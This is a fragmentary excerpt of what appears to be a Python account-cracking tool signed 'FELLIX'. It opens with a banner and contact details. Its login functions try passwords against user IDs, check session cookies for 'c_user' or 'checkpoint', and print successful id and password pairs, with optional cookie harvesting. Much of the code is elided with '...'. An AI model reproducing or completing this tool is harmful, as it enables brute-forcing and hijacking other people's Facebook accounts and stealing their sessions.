...
██      ███████ ███████ ███████ ██ ██   ██                                                                                   
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} FELLIX               {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H} FELLIX          {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+9232757#***#64          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/privaTe{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H} PRIVATE {P}     {N}      {H}     ║
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mFELLIX","\x1b[1;92mCYBER","\x1b[1;93mCYBER","\x1b[1;94mCYBER","\x1b[1;95mCYBER","\x1b[1;96mCYBER","\x1b[1;97mCYBER","\x1b[1;91mCYBER","\x1b[1;92mCYBER","\x1b[1;93mCYBER","\x1b[1;94mCYBER","\x1b[1;95mCYBER","\x1b[1;96mCYBER"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;33mFELLIX-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}FELLIX-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [FELLIX-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mFELLIX-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
...
def m5(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\x1b[1;91mFELLIX","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
